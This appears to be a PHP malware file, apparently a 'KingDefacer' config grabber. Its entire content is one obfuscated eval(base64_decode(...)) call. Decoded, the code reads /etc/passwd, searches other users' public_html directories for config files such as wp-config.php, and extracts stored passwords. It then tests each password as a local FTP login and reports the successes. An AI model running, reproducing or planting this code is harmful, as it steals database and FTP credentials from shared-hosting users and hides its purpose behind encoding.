<?php eval(base64_decode('P'.'z48P3BocAplY2hvICI8aHRtbD4iOwplY2hvICI8dGl0bGU+RWRpdGVkIEJ5IEtpbmdEZWZhY2VyPC90aXRsZT48Ym9keT4iOwoKc2V0X3RpbWVfbGltaXQoMCk7CiMjIyMjIyMjIyMjIyMjIyMjIwpAJHBhc3N3ZD1mb3BlbignL2V0Yy9wYXNzd2QnLCdyJyk7CmlmICghJHBhc3N3ZCkgewogIGVjaG8gIlstXSBFcnJvciA6IGNvdWRuJ3QgcmVhZCAvZXRjL3Bhc3N3ZCI7CiAgZXhpdDsKfQokcGF0aF90b19wdWJsaWM9YXJyYXkoKTsKJHVzZXJzPWFycmF5KCk7CiRwYXRodG9jb25mPWFycmF5KCk7CiRpPTA7Cgp3aGlsZSghZmVvZigkcGFzc3dkKSkgewokc3RyPWZnZXRzKCRwYXNzd2QpOwppZiAoJGk+MzUpIHsKICAgJHBvcz1zdHJwb3MoJHN0ciwiOiIpOwogICAkdXNlcm5hbWU9c3Vic3RyKCRzdHIsMCwkcG9zKTsKICAgJGRpcno9Ii9ob21lLyR1c2VybmFtZS9wdWJsaWNfaHRtbC8iOwogICBpZiAoKCR1c2VybmFtZSE9IiIpKSB7CiAgICAgICBpZiAoaXNfcmVhZGFibGUoJGRpcnopKSB7CiAgICAgICAgICAgYXJyYXlfcHVzaCgkdXNlcnMsJHVzZXJuYW1lKTsKICAgICAgICAgICBhcnJheV9wdXNoKCRwYXRoX3RvX3B1YmxpYywkZGlyeik7CiAgICAgICB9CiAgIH0KfQokaSsrOwp9CiMjIyMjIyMjIyMjIyMjIyMjIyMKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKZWNobyAiPGJyPjxicj4iOwplY2hvICI8dGV4dGFyZWEgbmFtZT0nbWFpbl93aW5kb3cnIGNvbHM9MTAwIHJvd3M9MjA+IjsKCmVjaG8gIlsrXSBGb3VuZGVkICIuc2l6ZW9mKCR1c2VycykuIiBlbnRyeXMgaW4gL2V0Yy9wYXNzd2RcbiI7CmVjaG8gIlsrXSBGb3VuZGVkICIuc2l6ZW9mKCRwYXRoX3RvX3B1YmxpYykuIiByZWFkYWJsZSBwdWJsaWNfaHRtbCBkaXJlY3Rvcmllc1xuIjsKCmVjaG8gIlt+XSBTZWFyY2hpbmcgZm9yIHBhc3N3b3JkcyBpbiBjb25maWcuKiBmaWxlcy4uLlxuXG4iOwpmb3JlYWNoICgkdXNlcnMgYXMgJHVzZXIpIHsKICAgICAgICRwYXRoPSIvaG9tZS8kdXNlci9wdWJsaWNfaHRtbC8iOwogICAgICAgcmVhZF9kaXIoJHBhdGgsJHVzZXIpOwp9CgplY2hvICJcblsrXSBEb25lXG4iOwoKZnVuY3Rpb24gcmVhZF9kaXIoJHBhdGgsJHVzZXJuYW1lKSB7CiAgIGlmICgkaGFuZGxlID0gb3BlbmRpcigkcGF0aCkpIHsKICAgICAgIHdoaWxlIChmYWxzZSAhPT0gKCRmaWxlID0gcmVhZGRpcigkaGFuZGxlKSkpIHsKICAgICAgICAgICAgICRmcGF0aD0iJHBhdGgkZmlsZSI7CiAgICAgICAgICAgICBpZiAoKCRmaWxlIT0nLicpIGFuZCAoJGZpbGUhPScuLicpKSB7CiAgICAgICAgICAgICAgICBpZiAoaXNfcmVhZGFibGUoJGZwYXRoKSkgewogICAgICAgICAgICAgICAgICAgJGRyPSIkZnBhdGgvIjsKICAgICAgICAgICAgICAgICAgIGlmIChpc19kaXIoJGRyKSkgewogICAgICAgICAgICAgICAgICAgICAgcmVhZF9kaXIoJGRyLCR1c2VybmFtZSk7CiAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCgkZmlsZT09J2NvbmZpZy5waHAnKSBvciAoJGZpbGU9PSdjb25maWcuaW5jLnBocCcpIG9yICgkZmlsZT09J2RiLmluYy5waHAnKSBvciAoJGZpbGU9PSdjb25uZWN0LnBocCcpIG9yICgkZmlsZT09J3dwLWNvbmZpZy5waHAnKSBvciAoJGZpbGU9PSd2YXIucGhwJykgb3IgKCRmaWxlPT0nY29uZmlndXJlLnBocCcpIG9yICgkZmlsZT09J2RiLnBocCcpIG9yICgkZmlsZT09J2RiX2Nvbm5lY3QucGhwJykpIHsgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYXNzPWdldF9wYXNzKCRmcGF0aCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkcGFzcyE9JycpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiWytdICRmcGF0aFxuJHBhc3NcbiI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ0cF9jaGVjaygkdXNlcm5hbWUsJHBhc3MpOwogICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgIH0KICAgICAgIH0KICAgfQp9CgpmdW5jdGlvbiBnZXRfcGFzcygkbGluaykgewogICBAJGNvbmZpZz1mb3BlbigkbGluaywncicpOwogICB3aGlsZSghZmVvZigkY29uZmlnKSkgewogICAgICAgJGxpbmU9ZmdldHMoJGNvbmZpZyk7CiAgICAgICBpZiAoc3Ryc3RyKCRsaW5lLCdwYXNzJykgb3Igc3Ryc3RyKCRsaW5lLCdwYXNzd29yZCcpIG9yIHN0cnN0cigkbGluZSwncGFzc3dkJykpIHsKICAgICAgICAgICBpZiAoc3RycnBvcygkbGluZSwnIicpKQogICAgICAgICAgICAgICRwYXNzPXN1YnN0cigkbGluZSwoc3RycG9zKCRsaW5lLCc9JykrMyksKHN0cnJwb3MoJGxpbmUsJyInKS0oc3RycG9zKCRsaW5lLCc9JykrMykpKTsKICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgJHBhc3M9c3Vic3RyKCRsaW5lLChzdHJwb3MoJGxpbmUsJz0nKSszKSwoc3RycnBvcygkbGluZSwiJyIpLShzdHJwb3MoJGxpbmUsJz0nKSszKSkpOwogICAgICAgICAgIHJldHVybiAkcGFzczsKICAgICAgIH0KICAgfQp9CgpmdW5jdGlvbiBmdHBfY2hlY2soJGxvZ2luLCRwYXNzKSB7CiAgICBAJGZ0cD1mdHBfY29ubmVjdCgnMTI3LjAuMC4xJyk7CiAgICBpZiAoJGZ0cCkgewogICAgICAgQCRyZXM9ZnRwX2xvZ2luKCRmdHAsJGxvZ2luLCRwYXNzKTsKICAgICAgIGlmICgkcmVzKSB7CiAgICAgICAgICBlY2hvICdbRlRQXSAnLiRsb2dpbi4nOicuJHBhc3MuIiAgU3VjY2Vzc1xuIjsKICAgICAgIH0KICAgICAgIGVsc2UgZnRwX3F1aXQoJGZ0cCk7CiAgICB9Cn0KCmVjaG8gIjwvdGV4dGFyZWE+PGJyPiI7CgplY2hvICI8L2JvZHk+PC9odG1sPiI7Cj8+Cg=='));
